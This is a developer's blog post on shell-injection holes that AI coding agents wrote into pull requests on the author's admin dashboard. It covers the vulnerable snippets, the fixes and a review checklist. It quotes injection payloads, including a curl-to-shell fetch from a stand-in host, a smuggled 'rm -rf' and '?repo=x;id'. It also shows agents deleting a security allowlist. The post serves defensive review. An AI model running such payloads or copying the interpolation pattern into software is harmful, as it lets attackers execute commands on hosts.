**Short answer:** My Claude Code agents wrote 7 shell commands built from strings into 30 PRs on my own admin dashboard. The repo had no tests and no CI, so review was the only gate. Review caught the 3 that took request input directly and one built from config, and fixed all 4 before merge. It missed 3: a URL query string, two values from the database, and a stored repo name whose check another agent PR deleted 3 minutes after it landed. Those 3 are still open in that repo.

This post is the code. The run itself, with dates and every finding, is in [the 30-PR case study](/work/30-reviewed-prs-3-vulnerabilities). The sketches below are trimmed from the real diffs, and each fix commit is named so the claim can be checked.

## Vuln 1: a job ID from the URL, straight into a shell

PR #112 added a "run now" button for cron jobs. The agent took the job ID from the URL path and built a command string:

```js
// Trimmed from 237cfaa. Do not ship.
// id comes straight from the URL path.
const out = execSync(
  `openclaw cron run "${id}"`,
);
```

`execSync` runs its argument through `/bin/sh`. The quotes don't help: `$(curl evil.sh | sh)` runs inside double quotes, and `x"; rm -rf /tmp/data; "` closes them. Anyone who could reach the route could run a command on the host.

It was also a regression. A security fix in February had put an allowlist on that ID, and the agent's rewrite of the route deleted it. The agent was asked to change the feature, and the allowlist was in the way.

**The fix** (`10bf07e`) put the allowlist back and passed the ID in an argument array, so no shell parses it. The [Node.js `child_process` docs](https://nodejs.org/api/child_process.html) list which functions spawn a shell.

```js
// From 10bf07e.
const SAFE_ID = /^[a-zA-Z0-9_-]+$/;
if (!SAFE_ID.test(id)) {
  return NextResponse.json(
    { error: "Invalid job ID" },
    { status: 400 },
  );
}
execFileSync("openclaw", ["cron", "run", id]);
```

Reading it again in October, I'd tighten it once more. That regex accepts an ID that starts with a hyphen, so `--help` still reaches the CLI as a flag. Requiring a letter or digit first (`/^[a-z0-9][a-z0-9_-]*$/i`) and passing `"--"` before the ID closes that.

## Vuln 2: a search query behind the agent's own filter, twice

PR #111 added log search. The agent ran the query through a regex and put what was left into a shell string:

```js
// Trimmed from cf68b1a. The regex is the agent's own.
const q = query.replace(
  /[^a-zA-Z0-9\s._-]/g,
  "",
);
execSync(`rg --json "${q}" ./logs`);
```

That regex is an allowlist. It strips `$`, quotes and backticks, everything a shell needs to get out of a double-quoted string, so as written it held. It keeps hyphens, so a query like `--files` still reached `rg` as a flag.

I treated it as a finding anyway, because one regex was the only thing between the request and the shell. The next day a different agent wrote memory search in PR #121 (`d718495`) and copied the same regex into the same pattern. The commit message called it "shell-safe query sanitization", which is how a reviewer gets talked out of looking.

Outside proof that a filter in front of a shell doesn't hold: Adversa AI's GuardFall research, disclosed 30 June 2026, bypassed the command filters of 10 of 11 open-source coding agents, because the filters inspect text that bash rewrites before it runs ([CSA research note, 11 July 2026](https://labs.cloudsecurityalliance.org/research/csa-research-note-guardfall-ai-coding-agent-shell-injection/)).

**The fix** (`42f1b03`, `b2d68a2`): pass the query in an argument array to `execFileSync`, with no shell. The filter then goes back to being input cleanup.

## What review missed

### #98: a query string into `gh`, kept by the fix commit

PR #98 added an issues API for a project picker. The agent read `repo`, `state` and `label` from the query string and built a `gh` command from them:

```js
// Trimmed from 0673fae. Still at the repo's HEAD.
const repo = searchParams.get("repo");
let cmd = `issue list -R ${repo} --state ${state}`;
if (label) cmd += ` --label "${label}"`;
ghExec(cmd); // execSync(`gh ${cmd}`)
```

`?repo=x;id` runs `id`. I reviewed this PR and asked for a cleanup. The fix commit (`28f057d`) moved `ghExec` into a shared helper, typed the route and removed every `any`. The command string came along unchanged. I found it on 12 October, seven months later, when an agent classifying every fix commit in the run listed it and I read the route again.

### #109: two values from the database

PR #109 built a diff viewer that reads a PR number and a repo name from the database and runs `gh pr view ${pr_number} -R ${project}` through `exec`. I let it through because the rows come from my overnight worker, not from a request. A stored value is input too: anything that can write that row can run a command.

### #117: a check deleted by the next PR

PR #117 sent a stored repo name into `sh -c`. Review added a format check, and it landed at 07:25 UTC on 13 March. PR #118 was open at the same time, and its feature commit deleted the only call to that check. It merged 3 minutes later. Each PR was fine against its own base, and nobody reviewed the two together.

The same audit found two stored XSS sinks in the search screens from Vuln 2, which are in [the case study](/work/30-reviewed-prs-3-vulnerabilities#what-review-missed).

## What the seven have in common

Every agent chose string interpolation into a shell, the shortest path to a command that works. Every dangerous value came from somewhere the agent didn't treat as hostile: a URL, a query string, a database row, a config file. Review caught the ones where the value came straight from the request. It missed the ones where the value went through a helper, a database or a second PR first.

Would an AI reviewer have caught the misses? I ran Claude Code's `/code-review` and my own reviewer agents on the original commits in October. Both flagged #109. `/code-review` left #117 out of its top 10 findings and named it only as a low-risk extra.

## How I check agent-written shell calls now

1. **Grep the added lines for every way into a shell.** This pattern found every call above, safe ones included:
   ```bash
   git diff origin/main...HEAD -U0 | grep '^+' \
     | grep -iE "exec[a-z]*\(|shell: true|sh', \['-c'"
   ```
2. **Trace each interpolated value to where it was first accepted.** Request, config and database values all count. A value in a shell string is a finding until it moves into an argument array.
3. **Read the fix commit as a new diff.** A refactor that moves a shell string into a helper keeps the bug and makes it harder to find.
4. **Review PRs that touch the same files together.** A check one PR adds can be deleted by another that was branched before it.
5. **Write the negative test.** If the repo has tests, they cover the happy path. Add one input with `;` or `$(` and assert the command never ran.
